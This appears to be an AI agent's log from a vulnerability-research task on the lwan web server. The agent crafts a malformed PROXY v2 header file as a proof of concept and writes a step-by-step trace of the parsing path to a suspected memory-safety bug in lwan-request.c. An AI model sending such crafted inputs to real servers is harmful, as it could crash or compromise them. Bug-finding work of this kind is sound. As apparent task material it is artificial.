Running command: python3 - <<'PY'
from pathlib import Path
sig=b'\r\n\r\n\x00\r\nQUIT\n'
# Try a minimal-but-valid PROXY v2 header with length 0 and extra data to see if parser miscomputes search span.
# Total bytes = 16+4 = 20. The parser will use size=16 and then memmem(buffer+16, remaining,...) on 4 leftover bytes.
# Use bytes that may create a bad span on some builds.
p=Path('/workspace/poc.bin')
p.write_bytes(sig + bytes([0x21, 0x20, 0x00, 0x00]))
print(p.stat().st_size)
PY
cat > /workspace/candidate_trace.json <<'JSON'
[
  {"step":1,"file":"src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1634,"var":"data_copy","code":"memcpy(data_copy, data, length);","note":"The attacker-supplied bytes are copied into the fixed request buffer used by the parser."},
  {"step":2,"file":"src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1649,"var":"request.flags","code":".flags = REQUEST_ALLOW_PROXY_REQS,","note":"The harness explicitly enables PROXY protocol handling for this input."},
  {"step":3,"file":"src/lib/lwan-request.c","function":"parse_http_request","line":1173,"var":"buffer","code":"buffer = parse_proxy_protocol(request, buffer);","note":"Parsing begins by interpreting the request start as a PROXY header when the flag is set."},
  {"step":4,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol","line":1158,"var":"buffer","code":"case MULTICHAR_CONSTANT('\\x0D','\\x0A','\\x0D','\\x0A'): return parse_proxy_protocol_v2(request, buffer);","note":"The crafted signature forces dispatch into the PROXY v2 parser."},
  {"step":5,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":232,"var":"size","code":"size = proto_signature_length + (unsigned int)ntohs(hdr->len);","note":"The v2 length field controls how far the parser advances within the attacker-controlled buffer."},
  {"step":6,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":233,"var":"size","code":"if (UNLIKELY(size > (unsigned int)sizeof(*hdr))) return NULL;","note":"A length that fits inside the header struct is accepted even though the actual payload bytes may be missing or too short for the later scan."},
  {"step":7,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":280,"var":"helper->crlfcrlf","code":"helper->crlfcrlf = memmem(buffer, adjusted_size, \"\\r\\n\\r\\n\", 4);","note":"After advancing by the claimed size, the parser searches for the HTTP delimiter in the remaining span; if the span is miscomputed relative to the real input, this becomes the memory-safety sink."}
]
